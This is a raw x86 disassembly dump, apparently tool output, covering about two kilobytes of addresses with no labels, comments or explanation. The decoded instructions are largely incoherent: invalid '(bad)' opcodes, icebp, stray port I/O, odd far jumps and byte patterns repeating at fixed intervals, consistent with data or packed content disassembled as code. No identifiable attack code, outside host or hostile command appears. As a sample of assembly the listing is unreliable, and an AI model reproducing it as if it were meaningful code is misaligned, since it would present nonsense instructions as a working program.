  410f90:	loope  0x410ffb
  410f92:	pop    edx
  410f93:	inc    ebx
  410f94:	sub    cl,dh
  410f96:	add    edx,DWORD PTR [edx]
  410f98:	mov    al,BYTE PTR es:[ebx+0x0]
  410f9c:	add    eax,0x41107840
  410fa1:	bound  eax,QWORD PTR [eax+0x40]
  410fa4:	sldt   WORD PTR [eax-0x34]
  410fa8:	js     0x41100c
  410faa:	add    eax,0x40664143
  410faf:	inc    ebx
  410fb0:	add    BYTE PTR [ecx+0x5],al
  410fb3:	js     0x410ff5
  410fb5:	bound  eax,QWORD PTR [eax+0x0]
  410fb8:	inc    eax
  410fb9:	stc    
  410fba:	imul   ebx,DWORD PTR es:[eax+0x17],0xffffffbf
  410fbf:	mov    al,0xcd
  410fc1:	fldcw  WORD PTR [ebp+esi*1-0x2f]
  410fc5:	in     al,dx
  410fc6:	es adc eax,0x47634841
  410fcc:	mov    edi,0xeec919b3
  410fd1:	dec    ebp
  410fd2:	les    eax,FWORD PTR [edi+0x56]
  410fd5:	inc    ecx
  410fd6:	push   ebx
  410fd7:	inc    eax
  410fd8:	dec    eax
  410fd9:	inc    eax
  410fda:	fadd   DWORD PTR [esi-0x6f]
  410fdd:	mov    cl,0x70
  410fdf:	add    DWORD PTR [eax],esi
  410fe1:	cmc    
  410fe2:	dec    esi
  410fe3:	in     al,dx
  410fe4:	push   esi
  410fe5:	mov    bl,0x1f
  410fe7:	mov    BYTE PTR [eax+0x434181dc],cl
  410fed:	inc    eax
  410fee:	inc    eax
  410fef:	add    eax,0x434162
  410ff4:	inc    eax
  410ff5:	add    BYTE PTR [edx+0x5],ah
  410ff8:	inc    eax
  410ff9:	adc    BYTE PTR [edx+0x40],ah
  410ffc:	inc    ebx
  410ffd:	inc    ecx
  410ffe:	add    eax,0x4340
  411003:	add    eax,0x404162
  411008:	add    BYTE PTR [eax+0x43],al
  41100b:	inc    eax
  41100c:	add    eax,0x70915164
  411011:	or     al,0xc5
  411013:	test   eax,0x594646a8
  411018:	pop    ds
  411019:	push   ebp
  41101a:	dec    edi
  41101b:	test   al,0x11
  41101d:	(bad)  
  41101e:	sti    
  41101f:	icebp  
  411020:	jo     0x410fed
  411022:	test   BYTE PTR [eax-0x48],0xe3
  411026:	dec    ebp
  411027:	add    bl,BYTE PTR [edi]
  411029:	push   ebp
  41102a:	dec    esp
  41102b:	sub    al,BYTE PTR [edx-0x58]
  41102e:	push   ecx
  41102f:	icebp  
  411030:	sbb    dh,BYTE PTR ds:0x113b4134
  411036:	xor    al,0x66
  411038:	mov    bl,0x41
  41103a:	xchg   BYTE PTR [eax+ebp*1],ah
  41103d:	aad    0xfd
  41103f:	push   ebp
  411040:	push   es
  411041:	dec    eax
  411042:	aad    0x1c
  411044:	cmp    ecx,DWORD PTR gs:[eax+edx*2-0x9]
  411049:	inc    eax
  41104a:	add    BYTE PTR [eax],al
  41104c:	inc    ecx
  41104d:	inc    ebx
  41104e:	add    eax,0x41784062
  411053:	inc    eax
  411054:	inc    eax
  411055:	add    BYTE PTR [edi],cl
  411057:	bound  eax,QWORD PTR [ebx+0x0]
  41105a:	add    eax,0x25006240
  41105f:	inc    eax
  411060:	add    eax,0x40254143
  411065:	add    eax,0x4f620000
  41106a:	push   edx
  41106b:	push   edx
  41106c:	add    al,0xcd
  41106e:	fnstenv [edx]
  411070:	push   esi
  411071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411072:	imul   BYTE PTR [eax]
  411074:	arpl   bp,cx
  411076:	cmp    bh,BYTE PTR [edi+0x64487893]
  41107c:	cmp    ebp,DWORD PTR [ecx-0x49]
  41107f:	and    bh,BYTE PTR [edi]
  411081:	bound  esp,QWORD PTR [edi*1+0x43222628]
  411088:	add    BYTE PTR [eax],al
  41108a:	add    BYTE PTR [ecx+0x40],al
  41108d:	bound  esp,QWORD PTR [esi+0x0]
  411090:	inc    eax
  411091:	add    eax,0x5400000
  411096:	inc    ecx
  411097:	inc    eax
  411098:	inc    eax
  411099:	bound  esp,QWORD PTR ds:0x25050043
  41109f:	inc    ecx
  4110a0:	inc    ebx
  4110a1:	inc    eax
  4110a2:	test   BYTE PTR [eax+0x0],al
  4110a5:	bound  ebx,QWORD PTR [eax+0x62]
  4110a8:	inc    ecx
  4110a9:	inc    eax
  4110aa:	pop    ebp
  4110ab:	pop    ecx
  4110ac:	mov    al,0x84
  4110ae:	mov    ah,0xb4
  4110b0:	push   ebx
  4110b1:	jae    0x411104
  4110b3:	xchg   ebp,eax
  4110b4:	mov    ah,0xcd
  4110b6:	inc    ecx
  4110b7:	add    eax,0x4155bf40
  4110bc:	sbb    dh,BYTE PTR gs:[ecx+eiz*2]
  4110c0:	add    DWORD PTR [ebx-0x6d],0x41406210
  4110c7:	and    eax,0x40000500
  4110cc:	inc    ebx
  4110cd:	add    eax,0x40624041
  4110d2:	inc    ebx
  4110d3:	add    eax,0x43402541
  4110d8:	bound  eax,QWORD PTR [eax+0x43]
  4110db:	int3   
  4110dc:	inc    eax
  4110dd:	bound  eax,QWORD PTR [eax]
  4110df:	inc    ecx
  4110e0:	inc    eax
  4110e1:	inc    eax
  4110e2:	add    eax,0x9abf5005
  4110e7:	add    al,0xca
  4110e9:	ins    BYTE PTR es:[edi],dx
  4110ea:	icebp  
  4110eb:	data16 mov dh,0xb0
  4110ee:	push   ss
  4110ef:	inc    ebx
  4110f0:	(bad)  
  4110f1:	out    dx,eax
  4110f2:	adc    BYTE PTR [edi+0x48],bh
  4110f5:	in     eax,0x8c
  4110f7:	push   eax
  4110f8:	dec    eax
  4110f9:	test   al,0x95
  4110fb:	push   cx
  4110fd:	retf   0x2462
  411100:	fiadd  WORD PTR [edi-0x593680ae]
  411106:	lds    edi,FWORD PTR [eax]
  411108:	test   eax,0xff3b91b4
  41110d:	les    ecx,FWORD PTR [edi-0x38]
  411110:	gs and eax,0x254062ca
  411116:	add    BYTE PTR [esi+0x40],ah
  411119:	add    eax,0x40404143
  41111e:	inc    ebx
  41111f:	add    BYTE PTR [eax],al
  411121:	add    BYTE PTR [edx-0x34],ah
  411124:	inc    eax
  411125:	add    eax,0x40004041
  41112a:	inc    ecx
  41112b:	int3   
  41112c:	add    BYTE PTR [ebx-0x7c],al
  41112f:	add    eax,0x5406240
  411134:	bound  edx,QWORD PTR ds:0x90444f43
  41113a:	mov    eax,0xb33d92b7
  41113f:	inc    eax
  411140:	les    eax,FWORD PTR [edi]
  411142:	xor    BYTE PTR [eax],ch
  411144:	add    al,0x35
  411146:	outs   dx,BYTE PTR ds:[esi]
  411147:	push   eax
  411148:	repz xor al,0x81
  41114b:	outs   dx,BYTE PTR ds:[esi]
  41114c:	pop    ebp
  41114d:	pop    edx
  41114e:	sbb    al,0x42
  411150:	jmp    0x411122
  411152:	arpl   WORD PTR ds:0x41331355,si
  411158:	rcl    BYTE PTR [edx+0x3f4d4648],1
  41115e:	sahf   
  41115f:	les    ebp,FWORD PTR ds:0x5247f765
  411165:	dec    ecx
  411166:	inc    ebx
  411167:	inc    edi
  411168:	pop    ecx
  411169:	aaa    
  41116a:	aad    0x46
  41116c:	outs   dx,BYTE PTR ds:[esi]
  41116d:	push   ebx
  41116e:	repz (bad) 
  411170:	sub    al,0x40
  411172:	bound  ebx,QWORD PTR [eax+0x41]
  411175:	add    eax,0x40404340
  41117a:	inc    ebx
  41117b:	inc    eax
  41117c:	test   BYTE PTR [eax],al
  41117e:	add    eax,0x40624041
  411183:	inc    eax
  411184:	add    BYTE PTR [edx+0x5],ah
  411187:	inc    ebx
  411188:	add    BYTE PTR [eax+0x78],al
  41118b:	inc    ecx
  41118c:	add    BYTE PTR [eax+0x41],bl
  41118f:	(bad)  
  411190:	fsub   QWORD PTR [ebp-0x20]
  411193:	mov    dh,0x59
  411195:	pop    edi
  411196:	dec    edi
  411197:	push   ebp
  411198:	lea    esi,ds:0xfbb14718
  41119e:	inc    esi
  41119f:	(bad)  
  4111a0:	retf   
  4111a1:	push   ebp
  4111a2:	arpl   WORD PTR [eax-0x32b7ac1d],si
  4111a8:	test   al,0xda
  4111aa:	loope  0x4111d9
  4111ac:	jne    0x4111c3
  4111ae:	inc    edx
  4111af:	inc    eax
  4111b0:	adc    al,BYTE PTR [eax-0x7c]
  4111b3:	add    ah,cl
  4111b5:	bound  eax,QWORD PTR ds:0xcc840f41
  4111bb:	inc    ebx
  4111bc:	add    BYTE PTR [eax+0x0],al
  4111bf:	inc    eax
  4111c0:	inc    eax
  4111c1:	inc    eax
  4111c2:	int3   
  4111c3:	add    BYTE PTR ds:0x62404341,al
  4111c9:	pop    eax
  4111ca:	add    BYTE PTR [ebx+0x40],al
  4111cd:	bound  ecx,QWORD PTR [edi]
  4111cf:	inc    eax
  4111d0:	adc    eax,0x53c04515
  4111d5:	adc    BYTE PTR [ecx-0xd6836b5],0xb1
  4111dc:	pop    ds
  4111dd:	rol    BYTE PTR [edx-0x7e],1
  4111e0:	mov    al,ds:0x5c386ea8
  4111e5:	push   ecx
  4111e6:	pop    ebp
  4111e7:	ret    
  4111e8:	adc    eax,0x7db34512
  4111ed:	ret    0xb4c4
  4111f0:	retf   
  4111f1:	in     al,0x9b
  4111f3:	inc    eax
  4111f4:	push   ebx
  4111f5:	dec    edi
  4111f6:	inc    esp
  4111f7:	adc    eax,0x10421542
  4111fc:	lahf   
  4111fd:	inc    ecx
  4111fe:	and    bl,cl
  411200:	push   ebp
  411201:	inc    ebx
  411202:	mov    bl,0x34
  411204:	add    BYTE PTR [eax-0x80],cl
  411207:	inc    edi
  411208:	add    BYTE PTR [eax],al
  41120a:	inc    eax
  41120b:	inc    eax
  41120c:	cmovno eax,DWORD PTR ds:0x40056243
  411213:	int3   
  411214:	add    ah,cl
  411216:	inc    eax
  411217:	inc    eax
  411218:	bound  eax,QWORD PTR [ecx+0x0]
  41121b:	add    BYTE PTR [edi],cl
  41121d:	inc    ebx
  41121e:	inc    eax
  41121f:	inc    eax
  411220:	add    BYTE PTR [ecx+0x43],al
  411223:	add    eax,0x40256240
  411228:	bound  eax,QWORD PTR [eax]
  41122a:	rcl    BYTE PTR [ebx+0x41],0x30
  41122e:	fld    DWORD PTR [edx-0x62]
  411231:	pop    ss
  411232:	add    al,0x20
  411234:	push   eax
  411235:	jae    0x411241
  411237:	(bad)  
  411238:	mov    ebp,0x33440810
  41123d:	mov    ebp,0x52fee831
  411242:	inc    esp
  411243:	and    dh,ch
  411245:	inc    edx
  411246:	mov    edi,0x22216331
  41124b:	ins    DWORD PTR es:[edi],dx
  41124c:	inc    ecx
  41124d:	mov    bl,0x72
  41124f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411250:	test   DWORD PTR [ebx+eiz*2+0x55503bb6],eax
  411257:	arpl   WORD PTR [ebx+eiz*2-0x58],ax
  41125b:	mov    al,ds:0x3d539342
  411260:	sub    al,0x6d
  411262:	inc    esp
  411263:	test   al,0x10
  411265:	fwait
  411266:	add    eax,0x4140cc00
  41126b:	inc    eax
  41126c:	inc    ebx
  41126d:	bound  esp,QWORD PTR ds:0x41400043
  411273:	add    BYTE PTR [eax],al
  411275:	add    eax,0x43624062
  41127a:	inc    ecx
  41127b:	inc    eax
  41127c:	inc    eax
  41127d:	inc    eax
  41127e:	add    eax,0x40624340
  411283:	add    eax,0x40664140
  411288:	neg    esp
  41128a:	cld    
  41128b:	bound  esi,QWORD PTR [edx]
  41128d:	mov    bh,0x27
  41128f:	xchg   ebp,eax
  411290:	adc    DWORD PTR [esi+0x747b255e],ebx
  411296:	inc    ecx
  411297:	inc    edx
  411298:	aas    
  411299:	test   al,0x95
  41129b:	arpl   WORD PTR [eax+ebp*4+0x6a455b71],di
  4112a2:	inc    esp
  4112a3:	xchg   edi,eax
  4112a4:	arpl   WORD PTR [ebp+0x2e],dx
  4112a7:	das    
  4112a8:	xor    edi,DWORD PTR [esi]
  4112aa:	sub    al,0x34
  4112ac:	xor    eax,0x4a139128
  4112b1:	(bad)  
  4112b2:	cli    
  4112b3:	dec    esp
  4112b4:	adc    eax,0x9f606b6b
  4112b9:	pop    ss
  4112ba:	lds    ebx,FWORD PTR [edx]
  4112bc:	inc    ecx
  4112bd:	xor    eax,0x50043b2
  4112c2:	inc    eax
  4112c3:	js     0x4112d5
  4112c5:	inc    ecx
  4112c6:	bound  eax,QWORD PTR [eax+0x40]
  4112c9:	sldt   WORD PTR [eax-0x34]
  4112cd:	js     0x411331
  4112cf:	add    eax,0x40664143
  4112d4:	inc    ebx
  4112d5:	add    BYTE PTR [ecx+0x5],al
  4112d8:	js     0x41131a
  4112da:	bound  eax,QWORD PTR [eax+0x0]
  4112dd:	inc    eax
  4112de:	hlt    
  4112df:	inc    ebx
  4112e0:	aam    0x4b
  4112e2:	cmp    eax,0x2f2a4562
  4112e7:	adc    bl,dh
  4112e9:	(bad)  
  4112ea:	gs mov esp,0x4e20748
  4112f0:	int3   
  4112f1:	inc    esp
  4112f2:	mov    WORD PTR ds:0x1695b44c,?
  4112f8:	cld    
  4112f9:	sub    al,0x68
  4112fb:	shl    eax,0x9d
  4112fe:	mov    ebp,0x4043417b
  411303:	inc    eax
  411304:	add    eax,0x434162
  411309:	inc    eax
  41130a:	add    BYTE PTR [edx+0x5],ah
  41130d:	inc    eax
  41130e:	adc    BYTE PTR [edx+0x40],ah
  411311:	inc    ebx
  411312:	inc    ecx
  411313:	add    eax,0x4340
  411318:	add    eax,0x404162
  41131d:	add    BYTE PTR [eax+0x43],al
  411320:	inc    eax
  411321:	add    eax,0x7ab1f8a9
  411326:	leave  
  411327:	xor    cl,BYTE PTR [ebp+edi*4-0x4c]
  41132b:	aad    0x68
  41132d:	fild   WORD PTR [esi+0x62]
  411330:	cmc    
  411331:	push   ecx
  411332:	pop    eax
  411333:	pusha  
  411334:	push   esi
  411335:	push   ebp
  411336:	adc    DWORD PTR [edx],0xe6039f3a
  41133c:	sub    BYTE PTR [eax+ecx*2],ch
  41133f:	outs   dx,BYTE PTR ds:[esi]
  411340:	push   ecx
  411341:	push   ecx
  411342:	addr16 inc esp
  411344:	dec    eax
  411345:	shr    BYTE PTR [eax+0x4b9fdc40],1
  41134b:	sub    al,0x5
  41134d:	inc    esp
  41134e:	adc    BYTE PTR [edx-0x6d],dl
  411351:	dec    esp
  411352:	inc    eax
  411353:	test   BYTE PTR [ebx+0x3d],0xfc
  411357:	aaa    
  411358:	popa   
  411359:	inc    eax
  41135a:	add    BYTE PTR [eax],al
  41135c:	inc    ecx
  41135d:	inc    ebx
  41135e:	add    eax,0x41784062
  411363:	inc    eax
  411364:	inc    eax
  411365:	add    BYTE PTR [edi],cl
  411367:	bound  eax,QWORD PTR [ebx+0x0]
  41136a:	add    eax,0x25006240
  41136f:	inc    eax
  411370:	add    eax,0x40254143
  411375:	add    eax,0x39620000
  41137a:	push   0xffffffcd
  41137c:	push   eax
  41137d:	add    al,0x5
  41137f:	inc    eax
  411380:	xlat   BYTE PTR ds:[ebx]
  411381:	add    dl,BYTE PTR [esi]
  411383:	dec    ebx
  411384:	fild   QWORD PTR [eax+0x33405042]
  41138a:	pop    eax
  41138b:	(bad)  
  41138c:	push   edx
  41138d:	adc    DWORD PTR [ebx+0x6f],edx
  411390:	jne    0x4113e8
  411392:	dec    ebp
  411393:	inc    esp
  411394:	aaa    
  411395:	lods   al,BYTE PTR ds:[esi]
  411396:	int3   
  411397:	inc    eax
  411398:	dec    esi
  411399:	push   ecx
  41139a:	fisubr WORD PTR [esi+eax*2]
  41139d:	inc    ecx
  41139e:	push   eax
  41139f:	lock xchg ecx,eax
  4113a1:	xor    al,dl
  4113a3:	hlt    
  4113a4:	xor    eax,0x7015402a
  4113a9:	adc    eax,0x44dc5cc
  4113ae:	lea    esi,[eax]
  4113b0:	adc    BYTE PTR [ecx+0x43],cl
  4113b3:	add    BYTE PTR [eax],al
  4113b5:	add    BYTE PTR [ecx+0x40],al
  4113b8:	bound  esp,QWORD PTR [esi+0x0]
  4113bb:	inc    eax
  4113bc:	add    eax,0x5400000
  4113c1:	inc    ecx
  4113c2:	inc    eax
  4113c3:	inc    eax
  4113c4:	bound  esp,QWORD PTR ds:0x25050043
  4113ca:	inc    ecx
  4113cb:	inc    ebx
  4113cc:	inc    eax
  4113cd:	test   BYTE PTR [eax+0x0],al
  4113d0:	bound  ebx,QWORD PTR [eax+0x62]
  4113d3:	inc    ecx
  4113d4:	inc    eax
  4113d5:	push   eax
  4113d6:	cmc    
  4113d7:	jnp    0x41143c
  4113d9:	ins    BYTE PTR es:[edi],dx
  4113da:	or     ch,BYTE PTR ds:0xb8e66891
  4113e0:	retf   
  4113e1:	push   ecx
  4113e2:	jb     0x4113a2
  4113e4:	push   esp
  4113e5:	outs   dx,BYTE PTR ds:[esi]
  4113e6:	inc    esp
  4113e7:	or     eax,0x5428a85f
  4113ec:	xchg   ecx,eax
  4113ed:	inc    edx
  4113ee:	sub    al,0x41
  4113f0:	and    eax,0xbf934142
  4113f5:	fdiv   st,st(2)
  4113f7:	mov    BYTE PTR [edx],dl
  4113f9:	or     al,dl
  4113fb:	inc    eax
  4113fc:	jmp    0x41140e
  4113fe:	bound  eax,QWORD PTR [eax+0x41]
  411401:	and    eax,0x40000500
  411406:	inc    ebx
  411407:	add    eax,0x40624041
  41140c:	inc    ebx
  41140d:	add    eax,0x43402541
  411412:	bound  eax,QWORD PTR [eax+0x43]
  411415:	int3   
  411416:	inc    eax
  411417:	bound  eax,QWORD PTR [eax]
  411419:	inc    ecx
  41141a:	inc    eax
  41141b:	inc    eax
  41141c:	add    eax,0x30010a05
  411421:	mov    al,ds:0xd6d07ada
  411426:	clc    
  411427:	popf   
  411428:	lods   al,BYTE PTR ds:[esi]
  411429:	adc    eax,0x9331aeb
  41142e:	test   al,0x44
  411430:	add    eax,0x4e1428cd
  411435:	inc    eax
  411436:	adc    BYTE PTR [ebx+ecx*8],ch
  411439:	inc    ecx
  41143a:	imul   esi,DWORD PTR [edi],0xffffffd5
  41143d:	xor    DWORD PTR [eax+esi*8+0x7c35986b],edi
  411444:	sahf   
  411445:	pop    ebp
  411446:	inc    edx
  411447:	int    0x2b
  411449:	cmp    BYTE PTR [ecx+edx*4-0x6f],al
  41144d:	rol    DWORD PTR [esi+0x40625a4a],1
  411453:	and    eax,0x5406600
  411458:	inc    ebx
  411459:	inc    ecx
  41145a:	inc    eax
  41145b:	inc    eax
  41145c:	inc    ebx
  41145d:	add    BYTE PTR [eax],al
  41145f:	add    BYTE PTR [edx-0x34],ah
  411462:	inc    eax
  411463:	add    eax,0x40004041
  411468:	inc    ecx
  411469:	int3   
  41146a:	add    BYTE PTR [ebx-0x7c],al
  41146d:	add    eax,0x5406240
  411472:	bound  esi,QWORD PTR [ecx]
  411474:	dec    esp
  411475:	adc    eax,0xee944170
  41147a:	inc    eax
  41147b:	cmp    BYTE PTR ds:0x68513049,bh
  411481:	inc    esp
  411482:	jmp    0x320e:0x1f50c312
  411489:	sub    al,0x2b
  41148b:	nop
  41148c:	dec    edx
  41148d:	ins    DWORD PTR es:[edi],dx
  41148e:	inc    ebp
  41148f:	xor    al,0xd8
  411491:	out    dx,al
  411492:	test   al,0x15
  411494:	push   0x7a
  411496:	xor    al,0x30
  411498:	inc    eax
  411499:	bound  ebx,QWORD PTR [eax+0x41]
  41149c:	add    eax,0x40404340
  4114a1:	inc    ebx
  4114a2:	inc    eax
  4114a3:	test   BYTE PTR [eax],al
  4114a5:	add    eax,0x40624041
  4114aa:	inc    eax
  4114ab:	add    BYTE PTR [edx+0x5],ah
  4114ae:	inc    ebx
  4114af:	add    BYTE PTR [eax+0x78],al
  4114b2:	inc    ecx
  4114b3:	add    BYTE PTR [eax+0x41],bl
  4114b6:	bound  esp,QWORD PTR [edx+0x5a]
  4114b9:	pusha  
  4114ba:	int    0x14
  4114bc:	xchg   edx,eax
  4114bd:	popf   
  4114be:	inc    edi
  4114bf:	inc    ecx
  4114c0:	test   ecx,esi
  4114c2:	inc    eax
  4114c3:	bound  edx,QWORD PTR [edi+ebp*2]
  4114c6:	nop
  4114c7:	cmp    al,0x44
  4114c9:	mov    al,0x42
  4114cb:	inc    esi
  4114cc:	je     0x41150f
  4114ce:	std    
  4114cf:	jle    0x4114fd
  4114d1:	adc    eax,0xf5398cd5
  4114d6:	inc    eax
  4114d7:	test   BYTE PTR [eax],al
  4114d9:	int3   
  4114da:	bound  eax,QWORD PTR ds:0xcc840f41
  4114e0:	inc    ebx
  4114e1:	add    BYTE PTR [eax+0x0],al
  4114e4:	inc    eax
  4114e5:	inc    eax
  4114e6:	inc    eax
  4114e7:	int3   
  4114e8:	add    BYTE PTR ds:0x62404341,al
  4114ee:	pop    eax
  4114ef:	add    BYTE PTR [ebx+0x40],al
  4114f2:	bound  ecx,QWORD PTR [edi]
  4114f4:	inc    eax
  4114f5:	das    
  4114f6:	das    
  4114f7:	in     al,dx
  4114f8:	retf   
  4114f9:	sub    BYTE PTR [ecx+0x58],bh
  4114fc:	ret    
  4114fd:	cs pop dx
  411500:	lods   al,BYTE PTR ds:[esi]
  411501:	dec    ebx
  411502:	test   al,0x73
  411504:	sbb    BYTE PTR [ecx],dh
  411506:	ret    0x4785
  411509:	fcom   QWORD PTR [ecx]
  41150b:	adc    BYTE PTR [ecx],ah
  41150d:	dec    ecx
  41150e:	arpl   WORD PTR [esp+ebx*8+0x2c],ax
  411512:	out    dx,al
  411513:	push   ebx
  411514:	inc    edi
  411515:	rcl    DWORD PTR [ecx+0x2c],cl
  411518:	mov    WORD PTR [eax],es
  41151a:	add    BYTE PTR [eax+0x40],al
  41151d:	cmovno eax,DWORD PTR ds:0x40056243
  411524:	int3   
  411525:	add    ah,cl
  411527:	inc    eax
  411528:	inc    eax
  411529:	bound  eax,QWORD PTR [ecx+0x0]
  41152c:	add    BYTE PTR [edi],cl
  41152e:	inc    ebx
  41152f:	inc    eax
  411530:	inc    eax
  411531:	add    BYTE PTR [ecx+0x43],al
  411534:	add    eax,0x40256240
  411539:	bound  eax,QWORD PTR [eax]
  41153b:	test   al,0xc7
  41153d:	dec    edx
  41153e:	push   ecx
  41153f:	inc    ebx
  411540:	lods   eax,DWORD PTR ds:[esi]
  411541:	jmp    0xf251:0x53cd1063
  411548:	out    0x5a,eax
  41154a:	lods   al,BYTE PTR ds:[esi]
  41154b:	nop
  41154c:	adc    bh,ch
  41154e:	mov    cl,0x21
  411550:	out    dx,eax
  411551:	test   DWORD PTR ds:0x544bc41,eax
  411557:	add    ah,cl
  411559:	inc    eax
  41155a:	inc    ecx
  41155b:	inc    eax
  41155c:	inc    ebx
  41155d:	bound  esp,QWORD PTR ds:0x41400043
  411563:	add    BYTE PTR [eax],al
  411565:	add    eax,0x43624062
  41156a:	inc    ecx
  41156b:	inc    eax
  41156c:	inc    eax
  41156d:	inc    eax
  41156e:	add    eax,0x40624340
  411573:	add    eax,0x40664140
  411578:	inc    eax
  411579:	dec    esi
  41157a:	inc    esp
  41157b:	inc    esp
  41157c:	leave  
  41157d:	aad    0x5
  41157f:	mov    bl,0x70
  411581:	adc    ebp,DWORD PTR [esi+0x2c]
  411584:	mov    esp,0x2b404128
  411589:	or     ebp,DWORD PTR [eax-0x18]
  41158c:	and    eax,0x2e334048
  411591:	xchg   ebp,eax
  411592:	adc    BYTE PTR [eax-0x49],al
  411595:	or     ecx,DWORD PTR [eax+ecx*2-0x3243d4ea]
  41159c:	mov    edi,0x32316ea9
  4115a1:	fild   DWORD PTR ds:0x5004369
  4115a7:	inc    eax
  4115a8:	js     0x4115ba
  4115aa:	inc    ecx
  4115ab:	bound  eax,QWORD PTR [eax+0x40]
  4115ae:	sldt   WORD PTR [eax-0x34]
  4115b2:	js     0x411616
  4115b4:	add    eax,0x40664143
  4115b9:	inc    ebx
  4115ba:	add    BYTE PTR [ecx+0x5],al
  4115bd:	js     0x4115ff
  4115bf:	bound  eax,QWORD PTR [eax+0x0]
  4115c2:	inc    eax
  4115c3:	mov    edi,0x6e5a0563
  4115c8:	aaa    
  4115c9:	ins    DWORD PTR es:[edi],dx
  4115ca:	out    0xbc,al
  4115cc:	les    ebp,FWORD PTR [eax-0x48beaf0e]
  4115d2:	aad    0xf1
  4115d4:	dec    edi
  4115d5:	mov    cl,0x13
  4115d7:	jno    0x41164a
  4115d9:	push   es
  4115da:	inc    ecx
  4115db:	test   al,0x34
  4115dd:	cs push ebx
  4115df:	ret    
  4115e0:	inc    edx
  4115e1:	sbb    ch,dh
  4115e3:	dec    eax
  4115e4:	mov    ss,WORD PTR [edi-0x424e24e9]
  4115ea:	mov    WORD PTR [esp+eax*2-0x60],es
  4115ee:	inc    esp
  4115ef:	push   0x50
  4115f1:	fs cmp al,0xd8
  4115f4:	or     al,0x28
  4115f6:	repz jno 0x411616
  4115f9:	or     esp,esp
  4115fb:	leave  
  4115fc:	lds    ebp,FWORD PTR [esi+0x53]
  4115ff:	inc    ebx
  411600:	push   edx
  411601:	inc    ecx
  411602:	inc    ebx
  411603:	inc    eax
  411604:	inc    eax
  411605:	add    eax,0x434162
  41160a:	inc    eax
  41160b:	add    BYTE PTR [edx+0x5],ah
  41160e:	inc    eax
  41160f:	adc    BYTE PTR [edx+0x40],ah
  411612:	inc    ebx
  411613:	inc    ecx
  411614:	add    eax,0x4340
  411619:	add    eax,0x404162
  41161e:	add    BYTE PTR [eax+0x43],al
  411621:	inc    eax
  411622:	add    eax,0x63bccd3c
  411627:	xor    eax,0x68939031
  41162c:	pop    eax
  41162d:	adc    eax,0xbab74389
  411632:	dec    edx
  411633:	call   0x4765452e
  411638:	pop    es
  411639:	nop
  41163a:	mov    cl,0x65
  41163c:	mov    WORD PTR [ecx-0x2f08af27],gs
  411642:	dec    edx
  411643:	dec    eax
  411644:	cmp    al,0x88
  411646:	call   0xc03e7113
  41164b:	inc    eax
  41164c:	add    BYTE PTR [eax],al
  41164e:	inc    ecx
  41164f:	inc    ebx
  411650:	add    eax,0x41784062
  411655:	inc    eax
  411656:	inc    eax
  411657:	add    BYTE PTR [edi],cl
  411659:	bound  eax,QWORD PTR [ebx+0x0]
  41165c:	add    eax,0x25006240
  411661:	inc    eax
  411662:	add    eax,0x40254143
  411667:	add    eax,0xf3620000
  41166c:	loop   0x411651
  41166e:	rol    BYTE PTR [ecx+0x17],0x21
  411672:	sub    ebp,ebx
  411674:	lds    eax,FWORD PTR [ecx+0x3f]
  411677:	scas   al,BYTE PTR es:[edi]
  411678:	fs dec esp
  41167a:	repz push ss
  41167c:	dec    ecx
  41167d:	test   al,0xc8
  41167f:	inc    esi
  411680:	adc    eax,0xf640259f
  411685:	inc    ebx
  411686:	add    BYTE PTR [eax],al
  411688:	add    BYTE PTR [ecx+0x40],al
  41168b:	bound  esp,QWORD PTR [esi+0x0]
  41168e:	inc    eax
  41168f:	add    eax,0x5400000
  411694:	inc    ecx
  411695:	inc    eax
  411696:	inc    eax
  411697:	bound  esp,QWORD PTR ds:0x25050043
  41169d:	inc    ecx
  41169e:	inc    ebx
  41169f:	inc    eax
  4116a0:	test   BYTE PTR [eax+0x0],al
  4116a3:	bound  ebx,QWORD PTR [eax+0x62]
  4116a6:	inc    ecx
  4116a7:	inc    eax
  4116a8:	ret    
  4116a9:	sti    
  4116aa:	mov    ds,WORD PTR [ecx+0x40]
  4116ad:	pop    ds
  4116ae:	jae    0x41163c
  4116b0:	mov    esp,0x91552dc4
  4116b5:	mov    edi,0x4f053c91
  4116ba:	test   al,0x42
  4116bc:	xor    esi,DWORD PTR ds:0xbfefe069
  4116c2:	adc    dl,BYTE PTR [ecx-0xf]
  4116c5:	lahf   
  4116c6:	and    eax,0xfd414fd5
  4116cb:	and    al,0x10
  4116cd:	bound  eax,QWORD PTR [eax+0x41]
  4116d0:	and    eax,0x40000500
  4116d5:	inc    ebx
  4116d6:	add    eax,0x40624041
  4116db:	inc    ebx
  4116dc:	add    eax,0x43402541
  4116e1:	bound  eax,QWORD PTR [eax+0x43]
  4116e4:	int3   
  4116e5:	inc    eax
  4116e6:	bound  eax,QWORD PTR [eax]
  4116e8:	inc    ecx
  4116e9:	inc    eax
  4116ea:	inc    eax
  4116eb:	add    eax,0xdc7d4005
  4116f0:	jg     0x411732
  4116f2:	pusha  
  4116f3:	cmp    edx,ebx
  4116f5:	sar    ebp,1
  4116f7:	enter  0x409a,0xbc
  4116fb:	aad    0x63
  4116fd:	dec    edi
  4116fe:	xor    eax,0x64ea14cb
  411703:	int    0x71
  411705:	mov    bl,0xdf
  411707:	mov    edi,0x11fa6b84
  41170c:	imul   ecx,DWORD PTR [ecx+0x40],0xe84b62be
  411713:	mov    esp,0xbe5799b1
  411718:	lds    esp,FWORD PTR [edx+0x40]
  41171b:	and    eax,0x5406600
  411720:	inc    ebx
  411721:	inc    ecx
  411722:	inc    eax
  411723:	inc    eax
  411724:	inc    ebx
  411725:	add    BYTE PTR [eax],al
  411727:	add    BYTE PTR [edx-0x34],ah
  41172a:	inc    eax
  41172b:	add    eax,0x40004041
  411730:	inc    ecx
  411731:	int3   
  411732:	add    BYTE PTR [ebx-0x7c],al
  411735:	add    eax,0x5406240
  41173a:	bound  edx,QWORD PTR [ecx+0x4cbf0d39]
  411740:	push   esi
  411741:	or     eax,0x42a80c4f
  411746:	cmp    edi,DWORD PTR [bx]
  411749:	test   al,0x43
  41174b:	push   edx
  41174c:	adc    DWORD PTR [eax+0x33],eax
  41174f:	aas    
  411750:	pusha  
  411751:	dec    ebp
  411752:	aas    
  411753:	sub    ch,BYTE PTR [esp+ecx*4+0x46bc4c1c]
  41175a:	jecxz  0x41176c
  41175c:	inc    ecx
  41175d:	outs   dx,BYTE PTR ds:[esi]
  41175e:	fnstcw WORD PTR [edi]
  411760:	xor    bl,BYTE PTR [ebp-0x2b]
  411763:	adc    DWORD PTR [edx],ecx
